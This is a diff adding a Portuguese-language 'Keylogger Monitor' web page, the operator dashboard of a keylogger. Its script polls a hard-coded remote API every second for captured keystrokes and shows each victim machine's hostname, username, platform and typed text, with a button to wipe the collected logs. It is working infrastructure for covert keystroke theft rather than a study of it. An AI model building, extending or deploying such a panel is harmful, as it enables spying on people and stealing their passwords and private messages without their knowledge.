@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keylogger Monitor</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+
+        .header {
+            background: #2c3e50;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .header h1 {
+            margin-bottom: 10px;
+            font-size: 2.5em;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            padding: 20px;
+            background: #f8f9fa;
+        }
+
+        .stat-card {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 2em;
+            font-weight: bold;
+            color: #3498db;
+        }
+
+        .content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            padding: 20px;
+        }
+
+        @media (max-width: 768px) {
+            .content {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .panel {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+
+        .panel-header {
+            background: #34495e;
+            color: white;
+            padding: 15px;
+            font-weight: bold;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .refresh-btn {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.9em;
+        }
+
+        .refresh-btn:hover {
+            background: #2980b9;
+        }
+
+        .panel-body {
+            padding: 15px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .keystroke-item {
+            padding: 10px;
+            border-bottom: 1px solid #ecf0f1;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .keystroke-item:last-child {
+            border-bottom: none;
+        }
+
+        .host-info {
+            font-weight: bold;
+            color: #2c3e50;
+            min-width: 150px;
+        }
+
+        .keys-preview {
+            flex-grow: 1;
+            margin: 0 15px;
+            font-family: 'Courier New', monospace;
+            background: #f8f9fa;
+            padding: 5px 10px;
+            border-radius: 5px;
+            word-break: break-all;
+        }
+
+        .time-info {
+            color: #7f8c8d;
+            font-size: 0.9em;
+            min-width: 120px;
+            text-align: right;
+        }
+
+        .client-list {
+            list-style: none;
+        }
+
+        .client-item {
+            padding: 15px;
+            border-bottom: 1px solid #ecf0f1;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .client-info {
+            flex-grow: 1;
+        }
+
+        .client-name {
+            font-weight: bold;
+            color: #2c3e50;
+        }
+
+        .client-stats {
+            text-align: right;
+        }
+
+        .keystroke-count {
+            background: #3498db;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-weight: bold;
+        }
+
+        .online-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #2ecc71;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+
+        .filters {
+            padding: 15px;
+            background: #f8f9fa;
+            border-bottom: 1px solid #ddd;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .filter-select {
+            padding: 8px 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background: white;
+            width: 200px;
+        }
+
+        .no-data {
+            text-align: center;
+            padding: 40px;
+            color: #7f8c8d;
+            font-style: italic;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #7f8c8d;
+        }
+
+        .error {
+            text-align: center;
+            padding: 20px;
+            color: #e74c3c;
+            background: #fdf2f2;
+            border-radius: 5px;
+            margin: 10px;
+        }
+
+        .status {
+            padding: 10px;
+            margin: 10px;
+            border-radius: 5px;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .status.online {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .status.offline {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔑 Keylogger Monitor</h1>
+            <p>Monitoramento em tempo real de atividades do teclado</p>
+            <div id="apiStatus" class="status"></div>
+        </div>
+
+        <div class="stats-grid" id="statsGrid">
+            <div class="stat-card">
+                <div class="stat-number" id="totalClients">0</div>
+                <div>Clientes Conectados</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="totalKeystrokes">0</div>
+                <div>Total de Teclas</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="activeToday">0</div>
+                <div>Ativos Hoje</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="lastActivity">-</div>
+                <div>Última Atividade</div>
+            </div>
+        </div>
+
+        <div class="filters">
+            <select id="hostFilter" class="filter-select">
+                <option value="">Todos os Hosts</option>
+            </select>
+            <button id="refreshBtn" class="refresh-btn">🔄 Atualizar</button>
+            <button id="clearBtn" class="refresh-btn" style="background: #e74c3c;">🗑️ Limpar Dados</button>
+            <span id="lastUpdate" style="color: #7f8c8d; margin-left: auto;"></span>
+        </div>
+
+        <div class="content">
+            <div class="panel">
+                <div class="panel-header">
+                    📝 Teclas em Tempo Real
+                    <button onclick="loadKeystrokes()" class="refresh-btn">↻</button>
+                </div>
+                <div class="panel-body" id="keystrokesList">
+                    <div class="loading">Carregando teclas...</div>
+                </div>
+            </div>
+
+            <div class="panel">
+                <div class="panel-header">
+                    💻 Clientes Conectados
+                    <button onclick="loadStats()" class="refresh-btn">↻</button>
+                </div>
+                <div class="panel-body">
+                    <ul class="client-list" id="clientsList">
+                        <div class="loading">Carregando clientes...</div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ✅ Configuração da API - SUBSTITUA pela sua URL do Vercel
+        const API_BASE_URL = 'https://keyloog.vercel.app';
+        
+        let allKeystrokes = [];
+        let allClients = [];
+
+        // Elementos DOM
+        const keystrokesList = document.getElementById('keystrokesList');
+        const clientsList = document.getElementById('clientsList');
+        const hostFilter = document.getElementById('hostFilter');
+        const totalClients = document.getElementById('totalClients');
+        const totalKeystrokes = document.getElementById('totalKeystrokes');
+        const activeToday = document.getElementById('activeToday');
+        const lastActivity = document.getElementById('lastActivity');
+        const refreshBtn = document.getElementById('refreshBtn');
+        const clearBtn = document.getElementById('clearBtn');
+        const lastUpdate = document.getElementById('lastUpdate');
+        const apiStatus = document.getElementById('apiStatus');
+
+        // ✅ Verificar status da API
+        async function checkApiStatus() {
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/health`);
+                if (response.ok) {
+                    const data = await response.json();
+                    apiStatus.textContent = `✅ API Online - ${data.server}`;
+                    apiStatus.className = 'status online';
+                    return true;
+                }
+            } catch (error) {
+                apiStatus.textContent = '❌ API Offline - Verifique a conexão';
+                apiStatus.className = 'status offline';
+            }
+            return false;
+        }
+
+        // ✅ Carregar estatísticas
+        async function loadStats() {
+            try {
+                clientsList.innerHTML = '<div class="loading">Carregando clientes...</div>';
+                
+                const response = await fetch(`${API_BASE_URL}/api/stats`);
+                if (!response.ok) throw new Error('Erro ao carregar estatísticas');
+                
+                const data = await response.json();
+                allClients = data.clients || [];
+                
+                updateClientsDisplay();
+                updateStats();
+                updateHostFilter();
+                
+                console.log('✅ Estatísticas carregadas:', data);
+            } catch (error) {
+                console.error('❌ Erro ao carregar estatísticas:', error);
+                clientsList.innerHTML = '<div class="error">Erro ao carregar clientes</div>';
+            }
+        }
+
+        // ✅ Carregar histórico de teclas
+        async function loadKeystrokes() {
+            try {
+                keystrokesList.innerHTML = '<div class="loading">Carregando teclas...</div>';
+                
+                const response = await fetch(`${API_BASE_URL}/api/keystrokes?limit=100`);
+                if (!response.ok) throw new Error('Erro ao carregar teclas');
+                
+                const data = await response.json();
+                allKeystrokes = data.keystrokes || [];
+                
+                updateKeystrokesDisplay();
+                updateLastUpdate();
+                
+                console.log('✅ Teclas carregadas:', data);
+            } catch (error) {
+                console.error('❌ Erro ao carregar teclas:', error);
+                keystrokesList.innerHTML = '<div class="error">Erro ao carregar teclas</div>';
+            }
+        }
+
+        // ✅ Limpar dados
+        async function clearData() {
+            if (!confirm('Tem certeza que deseja limpar todos os dados?')) return;
+            
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/clear`, { method: 'DELETE' });
+                if (!response.ok) throw new Error('Erro ao limpar dados');
+                
+                const data = await response.json();
+                alert('Dados limpos com sucesso!');
+                
+                // Recarregar dados
+                loadStats();
+                loadKeystrokes();
+                
+                console.log('✅ Dados limpos:', data);
+            } catch (error) {
+                console.error('❌ Erro ao limpar dados:', error);
+                alert('Erro ao limpar dados');
+            }
+        }
+
+        // ✅ Atualizar displays
+        function updateKeystrokesDisplay() {
+            const filteredKeystrokes = filterKeystrokes();
+            
+            if (filteredKeystrokes.length === 0) {
+                keystrokesList.innerHTML = '<div class="no-data">Nenhuma tecla registrada</div>';
+                return;
+            }
+
+            keystrokesList.innerHTML = filteredKeystrokes.map(ks => 
+                `<div class="keystroke-item">
+                    <div class="host-info" title="${ks.system_info.username}@${ks.system_info.hostname}">
+                        ${ks.system_info.hostname}
+                    </div>
+                    <div class="keys-preview" title="${ks.keys.join('')}">${escapeHtml(ks.keys.join(''))}</div>
+                    <div class="time-info">${formatTime(ks.timestamp)}</div>
+                </div>`
+            ).join('');
+        }
+
+        function updateClientsDisplay() {
+            if (allClients.length === 0) {
+                clientsList.innerHTML = '<li class="no-data">Nenhum cliente conectado</li>';
+                return;
+            }
+
+            clientsList.innerHTML = allClients.map(client => 
+                `<li class="client-item">
+                    <div class="client-info">
+                        <span class="online-indicator"></span>
+                        <span class="client-name">${client.hostname}</span>
+                        <div style="font-size: 0.9em; color: #7f8c8d;">
+                            ${client.username} • ${client.platform}
+                        </div>
+                    </div>
+                    <div class="client-stats">
+                        <div class="keystroke-count">${client.totalKeystrokes}</div>
+                        <div style="font-size: 0.8em; color: #7f8c8d; margin-top: 5px;">
+                            ${formatTime(client.lastSeen)}
+                        </div>
+                    </div>
+                </li>`
+            ).join('');
+        }
+
+        function updateStats() {
+            totalClients.textContent = allClients.length;
+            totalKeystrokes.textContent = allClients.reduce((sum, client) => sum + client.totalKeystrokes, 0);
+            
+            const today = new Date().toDateString();
+            const activeCount = allClients.filter(client => 
+                new Date(client.lastSeen).toDateString() === today
+            ).length;
+            activeToday.textContent = activeCount;
+
+            if (allKeystrokes.length > 0) {
+                lastActivity.textContent = formatTime(allKeystrokes[0].timestamp);
+            } else {
+                lastActivity.textContent = '-';
+            }
+        }
+
+        function updateHostFilter() {
+            const hosts = [...new Set(allClients.map(client => client.hostname))];
+            const currentValue = hostFilter.value;
+            
+            hostFilter.innerHTML = '<option value="">Todos os Hosts</option>' + 
+                hosts.map(host => `<option value="${host}" ${host === currentValue ? 'selected' : ''}>${host}</option>`).join('');
+        }
+
+        function updateLastUpdate() {
+            lastUpdate.textContent = `Última atualização: ${new Date().toLocaleTimeString('pt-BR')}`;
+        }
+
+        function filterKeystrokes() {
+            const selectedHost = hostFilter.value;
+            if (!selectedHost) return allKeystrokes.slice(0, 50);
+            return allKeystrokes.filter(ks => ks.system_info.hostname === selectedHost).slice(0, 50);
+        }
+
+        function formatTime(timestamp) {
+            try {
+                const date = new Date(timestamp);
+                return date.toLocaleString('pt-BR');
+            } catch (e) {
+                return 'Data inválida';
+            }
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // ✅ Event listeners
+        hostFilter.addEventListener('change', updateKeystrokesDisplay);
+        refreshBtn.addEventListener('click', () => {
+            loadStats();
+            loadKeystrokes();
+        });
+        clearBtn.addEventListener('click', clearData);
+
+        // ✅ Carregar dados iniciais
+        async function loadAllData() {
+            await checkApiStatus();
+            await loadStats();
+            await loadKeystrokes();
+        }
+
+        // ✅ Atualizar automaticamente a cada 10 segundos
+        setInterval(loadAllData, 1000);
+
+        // ✅ Iniciar quando a página carregar
+        window.addEventListener('load', loadAllData);
+    </script>
+</body>
+</html>
